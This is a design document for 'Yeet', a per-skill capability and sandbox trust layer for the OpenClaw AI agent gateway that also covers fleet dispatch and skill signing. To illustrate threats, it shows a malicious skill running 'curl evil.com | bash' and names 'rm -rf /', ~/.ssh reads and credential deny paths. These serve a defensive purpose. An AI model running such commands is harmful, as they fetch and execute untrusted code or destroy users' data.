---
layout: doc
title: Yeet — Trust Layer for OpenClaw
description: Per-skill capability model, silent sandbox enforcement, and fleet dispatch for OpenClaw.
---

# Yeet

A trust layer for OpenClaw. Per-skill capabilities approved once at install, enforced silently at runtime via Anthropic's sandbox runtime. Plus fleet dispatch to other machines — also sandboxed.

Version: 1.0.0
Date: 2026-03-29

---

## Table of Contents

1. [What This Is](#1-what-this-is)
2. [Personas](#2-personas)
3. [Architecture](#3-architecture)
4. [The Permission Problem](#4-the-permission-problem)
5. [Capability Model](#5-capability-model)
6. [Sandbox Enforcement](#6-sandbox-enforcement)
7. [Fleet Dispatch](#7-fleet-dispatch)
8. [Skill Scanning and Signing](#8-skill-scanning-and-signing)
9. [Data Flows](#9-data-flows)
10. [Security Model](#10-security-model)
11. [Repo Structure](#11-repo-structure)
12. [Migration Plan](#12-migration-plan)

---

## 1. What This Is

**OpenClaw** is a self-hosted gateway that connects 22+ chat platforms (Signal, Telegram, WhatsApp, Discord, iMessage, Slack, Matrix, etc.) to AI coding agents via Pi. It handles channels, sessions, routing, skills, a web UI, and mobile apps. MIT licensed, 339k stars.

**OpenClaw's security gap:** Skills are untrusted code with no permission model. ClawHub has no verification. The built-in sandbox (Docker, ASRT) is global — not scoped per skill. The result is that users either run everything unsandboxed or deal with constant permission prompts (Claude Code's model) and eventually pass `--dangerously-skip-permissions`.

**Yeet** fills this gap:

| Layer | What | Who Provides |
|-------|------|-------------|
| Channels (22+) | Signal, Telegram, WhatsApp, Discord, iMessage... | OpenClaw |
| Agent runtime | Pi with tool calling, sessions, extensions | OpenClaw + Pi |
| Gateway | WebSocket control plane, routing, presence | OpenClaw |
| Web UI + mobile | Chat, control panel, iOS/Android/macOS nodes | OpenClaw |
| Skills | AgentSkills format (SKILL.md), ClawHub registry | OpenClaw |
| **Trust model** | Per-skill capabilities, approve once, enforce always | **Yeet** |
| **Silent sandbox** | ASRT configs generated per-skill from approved capabilities | **Yeet** |
| **Skill scanning** | Static analysis, manifest validation, signing verification | **Yeet** |
| **Fleet dispatch** | Nomad orchestration, multi-agent, GPU routing | **Yeet** |
| **Homelab skills** | HA, meals, briefing — as OpenClaw skills with capability manifests | **Yeet** |

Yeet is not a fork. It's an OpenClaw plugin + Pi extension. Existing OpenClaw users install it and get per-skill trust without changing anything else.

---

## 2. Personas

Four user personas guide all UX decisions.

### 2.1 Home User — "Alex"

Non-technical. Wants a chat assistant for daily life via HA voice or Signal.

- "What's for dinner?" / "Turn off the lights" / "Add milk to the list"
- Installs skills from a curated list
- Capability approval: "Meal Planner wants to see your fridge. Allow?"
- Never sees: terminals, config files, fleet, code

### 2.2 Power User — "Sam"

Runs a homelab. Tech-comfortable, not a developer.

- Everything Alex does + community skills + scoped capability review
- "Calendar plugin requests External Network to calendar.google.com. Allow?"
- May write simple skills (SKILL.md)

### 2.3 Developer — "Jordan"

Software engineer. Runs coding agents on personal projects.

- Everything Sam does + `yeet` CLI + writes/signs skills
- "Run auth on peer6" / "What's running on the fleet?"
- 1-2 fleet nodes, single coding agent per task

### 2.4 Platform Engineer — "Riley"

Multi-project, multi-model, multi-agent. Full fleet.

- Everything Jordan does + Composio orchestration + CI scanning + audit
- "Build physics with gemini for engine, claude for tests"
- 3+ fleet nodes, GPU routing, cost tracking

### 2.5 Feature Matrix

| Feature | Alex | Sam | Jordan | Riley |
|---------|:----:|:---:|:------:|:-----:|
| Chat (Signal/HA/Telegram/etc.) | ✓ | ✓ | ✓ | ✓ |
| Capability approval | plain language | scoped | manifest-level | CI strict |
| Write skills | — | ✓ | ✓ | ✓ |
| Sign/publish skills | — | — | ✓ | ✓ |
| Fleet dispatch | — | — | basic | full |
| Multi-agent coding | — | — | — | ✓ |
| Audit logs | — | — | — | ✓ |

### 2.6 Auditability Principle

- Skill code is readable: one `SKILL.md` + one `plugin.json`, no build step
- Capabilities are explicit: every permission approved by the user, persisted as JSON
- Every tool call is logged: timestamp, tool name, args, result, skill, capability used
- The scanner is deterministic: same findings every time
- No hidden network calls: ASRT enforces domain allowlists at the kernel level
- History is queryable: all data in SQLite

---

## 3. Architecture

```
Chat Apps                       Fleet
(Signal, Telegram,              (Nomad + your machines)
 WhatsApp, Discord,
 iMessage, Slack...)                 ┌──────────────┐
       │                             │ Fleet Node   │
       ▼                             │ OpenClaw     │
┌──────────────────┐    dispatch     │ + yeet       │
│ OpenClaw Gateway │ ──────────────▶ │ + ASRT       │
│ + Pi Agent       │    (Nomad)      │              │
│ + yeet plugin    │ ◀──────────────│ Results/PRs  │
│ + ASRT sandbox   │    webhook      └──────────────┘
│                  │
│ Web UI / Mobile  │
└──────────────────┘

yeet hooks into OpenClaw at these points:

Pi Agent ──▶ tool call ──▶ Interceptor (tool.before)
                               │
                          yeet: check capability approval
                          ✓ approved → generate ASRT config
                          ✗ denied → block, return error
                               │
                          ASRT: wrap command with sandbox
                          kernel-enforced filesystem + network
                               │
                          tool executes (sandboxed)
                               │
                          Interceptor (tool.after)
                          yeet: audit log
```

### Yeet Sits Above the Agent

The coding agent (Claude Code, Pi, OpenCode, Aider) runs inside the sandbox unaware of restrictions. It never sees permission prompts — yeet already decided, ASRT already enforced:

```
┌─────────────────────────────────────────────────┐
│ Yeet Capability Gate                             │
│ "Does this skill have approved capabilities?"    │
│ YES → continue. NO → block.                     │
├─────────────────────────────────────────────────┤
│ ASRT Sandbox                                     │
│ Kernel-enforced filesystem + network             │
│ Per-skill config from approved capabilities      │
├─────────────────────────────────────────────────┤
│ Coding Agent (Claude Code / Pi / OpenCode)       │
│ Runs as if --dangerously-skip-permissions        │
│ But actual permissions are TIGHTER than default  │
│ because ASRT is kernel-enforced + scoped         │
│                                                  │
│ Agent's own permission system = irrelevant       │
│ No prompts. No fatigue. No skipping.            │
├─────────────────────────────────────────────────┤
│ OS Kernel                                        │
│ Seatbelt (macOS) / bubblewrap+seccomp (Linux)   │
│ Cannot be bypassed by any userspace code         │
└─────────────────────────────────────────────────┘
```

The agent thinks it has full access. It doesn't. Every file write, network call, and subprocess is filtered by the kernel before it completes. The agent gets clean errors for denied actions, not permission prompts.

This means any agent runtime works — Claude Code, Pi, OpenCode, Aider, Codex CLI — without modifying the agent or its permission model. Yeet wraps them all the same way.

### Integration Points (no fork needed)

| Hook | What yeet does |
|------|---------------|
| **Interceptor `tool.before`** | Check capability approval, generate per-skill ASRT config |
| **Interceptor `tool.after`** | Audit log every tool call |
| **Pi `registerTool`** | Replace bash/read/write/edit with ASRT-wrapped Operations |
| **Pi `BashOperations`** | Route all commands through `SandboxManager.wrapWithSandbox()` |
| **Plugin `before_tool_call`** | Approval flow for first-time dangerous capabilities |
| **OpenClaw `registerTool`** | Register fleet dispatch as a tool |
| **OpenClaw `registerHttpRoute`** | Webhook endpoint for fleet results |

---

## 4. The Permission Problem

Three approaches to AI agent security exist today:

**A. Ask every time (Claude Code default)**
```
Want to run: npm install     → [Allow] [Deny]
Want to run: git status      → [Allow] [Deny]
Want to run: ls src/         → [Allow] [Deny]
```
Secure but unusable. Users get prompt fatigue and disable it.

**B. Allow everything (`--dangerously-skip-permissions`)**
```
Agent runs with full access. Fast, productive, dangerous.
```
Where most people end up after getting tired of A.

**C. Approve once, enforce always (yeet)**
```
Installing "Meal Planner":
  ✓ Meal Data (low risk)
  ✓ External Network: meals-api.wan0.cloud (medium)
  ✓ Paid API Calls: workers-ai (medium)
  Allow all? [Y]

→ Runs without prompts. ASRT enforces boundaries silently.
→ If the skill tries meals-evil.com → kernel blocks it. No prompt.
```

Option C is what mobile OS app stores figured out years ago. Yeet brings it to AI agents.

---

## 5. Capability Model

### 5.1 Named Capabilities

Skills declare named capabilities in their manifest. Users approve or deny each.

```json
{
  "name": "meals",
  "version": "0.2.0",
  "type": "plugin",
  "capabilities": [
    {
      "capability": "data.meals",
      "reason": "Read and update fridge, freezer, pantry, recipes"
    },
    {
      "capability": "network.external",
      "reason": "Call the meals API backend",
      "scope": ["meals-api.wan0.cloud"]
    },
    {
      "capability": "cost.api",
      "reason": "Suggestions use LLM inference",
      "scope": ["workers-ai"]
    }
  ]
}
```

### 5.2 Capability Registry

19 capabilities across 7 categories:

| Category | Capabilities | Risk |
|----------|-------------|------|
| **Network** | `network.external`, `network.internal` | medium |
| **Home** | `home.read`, `home.control`, `home.automation` | low—medium |
| **Data** | `data.meals`, `data.history`, `data.memory`, `data.preferences` | low—medium |
| **Fleet** | `fleet.dispatch`, `fleet.read`, `fleet.manage` | medium—high |
| **Notify** | `notify.signal`, `notify.push` | low—high |
| **System** | `system.files.read`, `system.files.write`, `system.exec`, `system.env` | high—dangerous |
| **Cost** | `cost.api` | medium |

### 5.3 Scope Narrows Risk

`network.external` with `scope: ["meals-api.wan0.cloud"]` is very different from `network.external` with no scope. Unscoped dangerous capabilities are flagged during scanning.

A skill with `system.exec` scoped to `["git", "npm"]` can run git and npm. It cannot run `rm`, `curl`, or anything else. Enforced by ASRT, not just policy.

### 5.4 Approval Persistence

Approvals stored in `~/.config/yeet/approvals/{skill-name}.json`:

```json
{
  "skill": "meals",
  "version": "0.2.0",
  "approved": ["data.meals", "network.external", "cost.api"],
  "denied": [],
  "approvedAt": "2026-03-29T10:00:00Z"
}
```

Version-pinned. If a skill updates and requests new capabilities, user is prompted again for the new ones only.

### 5.5 Approval UX Adapts to Persona

- **Alex**: "Meal Planner wants to see your fridge. Allow?"
- **Sam**: "Meal Planner requests: Meal Data (low), External Network to meals-api.wan0.cloud (medium). Allow?"
- **Jordan**: Reviews `plugin.json` directly
- **Riley**: `yeet verify --strict` in CI, auto-approve trusted signers

---

## 6. Sandbox Enforcement

### 6.1 Anthropic Sandbox Runtime (ASRT)

`@anthropic-ai/sandbox-runtime` — open-source, Apache-2.0. Uses OS-level primitives:

| Platform | Filesystem | Network | Subprocess |
|----------|-----------|---------|-----------|
| macOS | `sandbox-exec` (Seatbelt profiles) | Seatbelt + proxy | Seatbelt |
| Linux | `bubblewrap` (bind mounts) | Network namespace + proxy | `seccomp` BPF |

Kernel-enforced. A sandboxed process cannot bypass restrictions regardless of what code it runs.

### 6.2 Per-Skill ASRT Configuration

Yeet maps approved capabilities to ASRT config. Each skill gets its own sandbox profile:

```
Skill "meals" approved for:
  network.external: ["meals-api.wan0.cloud"]
  data.meals: (internal gateway access)

→ ASRT config:
  network.allowedDomains: ["meals-api.wan0.cloud"]
  filesystem.allowWrite: []          ← no write access
  filesystem.denyRead: ["~/.ssh", "~/.aws", "~/.config/yeet/approvals"]
```

```
Skill "coding-agent" approved for:
  system.exec: ["git", "npm", "node"]
  system.files.write: ["./workspace"]
  network.external: ["github.com", "registry.npmjs.org"]

→ ASRT config:
  network.allowedDomains: ["github.com", "registry.npmjs.org"]
  filesystem.allowWrite: ["./workspace"]
  filesystem.denyRead: ["~/.ssh", "~/.aws"]
```

### 6.3 Silent Enforcement

No prompts at runtime. The ASRT config is locked in when the skill is approved. If the skill tries to reach a host outside its scope:

```
[ASRT] network violation: skill "meals" attempted connection to evil.com
       allowed domains: meals-api.wan0.cloud
       action: BLOCKED
       (logged to ~/.config/yeet/audit.db)
```

The user never sees this unless they check the audit log. The skill gets a connection error. The agent handles it gracefully ("The meals API seems unavailable right now").

### 6.4 Defence in Depth

Five layers, all must fail for damage:

```
Layer 1: OpenClaw tool policy
  deny: ["group:automation"], exec.security: "ask"

Layer 2: Yeet capability gate (interceptor tool.before)
  Block if skill lacks approved capability

Layer 3: Yeet approval flow (before_tool_call)
  First-time dangerous ops → user confirms once

Layer 4: ASRT sandbox (per-skill config)
  Kernel-enforced filesystem + network restrictions

Layer 5: Mandatory deny paths (ASRT built-in)
  .bashrc, .zshrc, .gitconfig, .ssh, .aws — always denied
```

---

## 7. Fleet Dispatch

For coding tasks that need other machines (GPU, specific hardware, parallel agents).

### 7.1 How It Works

```
User: "build physics system for game, use gemini"
  │
  ▼
OpenClaw + yeet: capability check (fleet.dispatch → approved)
  │
  ▼
Nomad API: dispatch to node with GPU
  constraint: meta.project_game = true
  device: nvidia/gpu
  │
  ▼
Fleet node (yeet-02):
  OpenClaw + yeet (same stack, same trust model)
  │
  ├── Approved capabilities propagated from dispatch
  ├── ASRT sandbox config generated on the node
  ├── Composio AO decomposes task into subtasks
  │
  ├── Worker A (OpenCode + Gemini) → ASRT sandbox
  │   allowWrite: ["./workspace/game"]
  │   allowedDomains: ["openrouter.ai", "github.com", "registry.npmjs.org"]
  │
  ├── Worker B (OpenCode + Claude) → ASRT sandbox
  │   same scoping
  │
  ├── Each worker: code → commit → push → PR
  ├── CI runs, failures auto-retried
  │
  └── Webhook → your machine: "PRs ready for review"
```

### 7.2 Same Security Everywhere

The fleet isn't a separate security domain. Every node runs OpenClaw + yeet + ASRT. Capabilities approved on your machine propagate to fleet nodes. A skill approved for `system.files.write: ["./workspace"]` gets that same ASRT config on every node.

### 7.3 Nomad Handles Infrastructure

| Need | Solution |
|------|----------|
| Task scheduling | Nomad job dispatch |
| GPU routing | Nomad device plugins + constraints |
| Node health | Nomad client health checks |
| Log streaming | Nomad allocation logs |
| Cost tracking | Nomad encrypted variables |
| Node drain | Nomad drain API |

No custom infrastructure. Nomad is the scheduler, yeet is the trust layer, ASRT is the sandbox.

### 7.4 GitHub Safety

Coding agents use a dedicated bot account (`wan0-bot`) with:
- Fine-grained PAT scoped to specific repos
- Contents + PRs only (no admin, no settings, no secrets)
- Branch protection: main requires PR + approval
- Agents can create PRs but cannot merge to main

---

## 8. Skill Scanning and Signing

### 8.1 The Scanner (`yeet verify`)

```bash
$ yeet verify ./my-skill

  ✓ [PLUGIN_001] Manifest valid
  ⚠ [PLUGIN_002] Skill is unsigned
  · [PLUGIN_OK] Found 8 tool(s)
  · [PLUGIN_OK] External Network: meals-api.wan0.cloud (medium)
  · [PLUGIN_OK] Meal Data (low)

  PASS with 1 warning(s)
```

Checks:
- Manifest validation (required fields, types, runtime)
- Signature verification (Ed25519)
- Capability risk assessment (flag unscoped dangerous capabilities)
- Static analysis (detect subprocess execution, filesystem mutation, FFI)
- Tool definition completeness (descriptions, schemas)

### 8.2 Signing

```bash
$ yeet sign ./my-skill
  Signed with key: wan0 (sha256:abc123...)
  Signature written to plugin.json
```

Ed25519 signatures. Trust levels:
- `full` — load silently (your own skills)
- `prompt` — show capabilities, ask before loading
- `audit` — load but log everything

### 8.3 Install Flow

```bash
$ yeet plugin add https://github.com/user/some-skill

  Cloning...
  Scanning...
    ✓ Manifest valid
    ⚠ Unsigned
    · 3 tool(s)
    · Requests: network.external (github.com), system.exec (git)

  This skill requests:
    External Network: github.com only          (medium risk)
    Run Programs: git only                     (high risk)

  Allow? [Y/n/details]
  > y

  Installed to ~/.config/yeet/plugins/some-skill/
  Capabilities approved.
```

---

## 9. Data Flows

### Flow 1: "What's for dinner?" (Signal)

```
Signal message → OpenClaw → Pi Agent
  → tool call: meals_suggest({mood: "quick"})
  → yeet interceptor: meals skill has data.meals + network.external approved ✓
  → ASRT sandbox: allowedDomains=["meals-api.wan0.cloud"], allowWrite=[]
  → fetch meals-api.wan0.cloud/suggest (sandboxed)
  → result back to Pi → response on Signal
  → yeet audit log: meals_suggest, args, result, 200ms
```

### Flow 2: "Turn off the lights" (HA voice)

```
HA Assist → OpenClaw → Pi Agent
  → tool call: ha_call_service({domain: "light", service: "turn_off"})
  → yeet interceptor: HA skill has home.control approved ✓
  → ASRT sandbox: allowedDomains=["homeassistant.local"]
  → POST homeassistant.local:8123/api/services/light/turn_off (sandboxed)
  → result → "Done, lights off." → HA TTS
```

### Flow 3: "Build physics for the game" (Signal)

```
Signal → OpenClaw → Pi Agent
  → tool call: fleet_dispatch({project: "game", prompt: "physics system"})
  → yeet interceptor: fleet.dispatch approved ✓
  → Nomad dispatch to GPU node
  → Fleet node: OpenClaw + yeet + ASRT
    → Composio decomposes into workers
    → Workers run in per-skill ASRT sandboxes
    → PRs created via bot account
  → Webhook back: "3 PRs ready"
  → Signal: "Physics PRs ready — engine (#42), dynamics (#43), tests (#44). Merge?"
```

### Flow 4: Malicious skill attempt

```
User installs community skill from ClawHub
  → yeet verify: runs scanner
    ⚠ Requests network.external with no scope (unrestricted)
    ⚠ Requests system.exec with no scope (unrestricted)
    ⚠ Static analysis: found Deno.Command usage

  This skill requests:
    External Network: ANY HOST               (⚠ medium risk, unscoped!)
    Run Programs: ANY PROGRAM                (⚠ dangerous, unscoped!)

  Allow? [Y/n/details]
  > n

  Skill not installed.
```

If the user had approved it anyway:
```
Skill tries: curl evil.com | bash
  → Layer 2 (yeet gate): system.exec approved ✓ (user accepted the risk)
  → Layer 4 (ASRT): curl to evil.com... but wait:
    If user approved network.external with no scope → allowed
    If user approved network.external with scope → BLOCKED at kernel level
  → Layer 5 (ASRT mandatory denies): write to .bashrc → BLOCKED always
```

The scanner's job is to make sure the user sees the risk before approving. ASRT's job is to enforce whatever they approved. The narrower the scope, the less damage possible.

---

## 10. Security Model

### 10.1 Threat Matrix

| Threat | Mitigation |
|--------|-----------|
| Skill reads ~/.ssh | ASRT mandatory deny path — always blocked |
| Skill exfiltrates data to unknown host | ASRT network allowlist — kernel-enforced |
| Skill writes outside workspace | ASRT filesystem allowWrite — kernel-enforced |
| Skill runs rm -rf / | yeet capability gate — blocked unless system.exec approved; ASRT allowWrite scoping |
| Skill requests broad permissions | Scanner flags unscoped dangerous capabilities; user warned before approval |
| Malicious skill on ClawHub | Scanning on install; unsigned = warning; signing = signer accountability |
| Coding agent merges bad code | Branch protection: PR + approval required, bot account can't force push |
| Fleet node compromised | Same ASRT sandbox on every node; node can only reach approved hosts |
| OpenClaw gateway compromised | Gateway runs in Docker with restricted network; fleet access via Nomad API only |
| Prompt injection via tool results | Tool results are data (tool role), not system prompts; truncated to prevent stuffing |

### 10.2 What Yeet Cannot Protect Against

- A user who approves `system.exec` + `network.external` with no scope — that's root access. The scanner warns loudly, but the user decides.
- Bugs in ASRT itself (kernel sandbox escapes — extremely rare but theoretically possible)
- A compromised LLM provider returning malicious tool calls — the capability gate limits blast radius but can't prevent all misuse of approved capabilities
- Social engineering in skill descriptions ("This skill needs full network access to... check the weather")

Yeet's philosophy: make the risk visible, make the boundaries enforceable, let the user decide. Don't nag on every action — that just trains users to click "allow" without reading.

---

## 11. Repo Structure

```
yeet/                              # Public umbrella
├── docs/                          # Design docs, project site
├── ansible/                       # Fleet provisioning
├── jobs/                          # Nomad job templates
├── packages/
│   ├── sdk/                       # Capability types, scanning, trust
│   ├── openclaw-plugin/           # OpenClaw plugin: interceptors, hooks
│   ├── pi-extension/              # Pi extension: ASRT-wrapped Operations
│   ├── cli/                       # yeet CLI: init, verify, sign, approve
│   ├── frontend/                  # Dashboard additions for OpenClaw web UI
│   └── sandbox/                   # ASRT config generator from capabilities
```

**Skills are separate repos:**
```
yeet-skill-meals/                  # Meal planning (OpenClaw skill + capability manifest)
yeet-skill-ha/                     # Home Assistant control
yeet-skill-briefing/               # News briefing
yeet-skill-fleet/                  # Fleet dispatch via Nomad
yeet-skill-composio/               # Multi-agent orchestration
yeet-skill-godot/                  # Godot game dev via MCP
```

**Dependency graph:**
```
yeet-sdk                           (zero deps)
  ↑
yeet-sandbox                       (sdk + @anthropic-ai/sandbox-runtime)
  ↑
yeet-openclaw-plugin               (sdk + sandbox)
yeet-pi-extension                  (sdk + sandbox + Pi agent-core)
yeet-cli                           (sdk)
yeet-frontend                      (sdk, talks to OpenClaw web UI)
yeet-skill-*                       (sdk for types only)
```

---

## 12. Migration Plan

### Phase 1: Core Trust Layer
- `yeet-sdk`: capability types and scanning (done)
- `yeet-cli`: `yeet verify` scanner (done), `yeet init`, `yeet approve`
- `yeet-sandbox`: ASRT config generator from capabilities

### Phase 2: OpenClaw Integration
- `yeet-openclaw-plugin`: interceptor pipeline (tool.before/after), approval flow
- `yeet-pi-extension`: ASRT-wrapped BashOperations, ReadOperations, WriteOperations, EditOperations
- Test: install existing OpenClaw skill, scan it, approve capabilities, verify ASRT enforces

### Phase 3: Homelab Skills
- `yeet-skill-meals`: meal planning
- `yeet-skill-ha`: Home Assistant
- `yeet-skill-briefing`: news digest
- Test: "what's for dinner?" and "turn off the lights" work through OpenClaw + yeet

### Phase 4: Fleet Dispatch
- `yeet-skill-fleet`: Nomad dispatch as OpenClaw skill
- `yeet-skill-composio`: multi-agent orchestration
- Fleet node provisioning via Ansible (OpenClaw + yeet + ASRT)
- Test: coding task dispatched to fleet node, runs sandboxed, PRs created

### Phase 5: Signing and Registry
- `yeet sign` command (Ed25519)
- Trust store management
- CI integration (`yeet verify --strict`)
- Publish first-party skills with signatures

### Phase 6: Dashboard
- Fleet monitoring, agent status, PR review
- Cost tracking per skill/model
- Audit log viewer
- Capability approval management UI
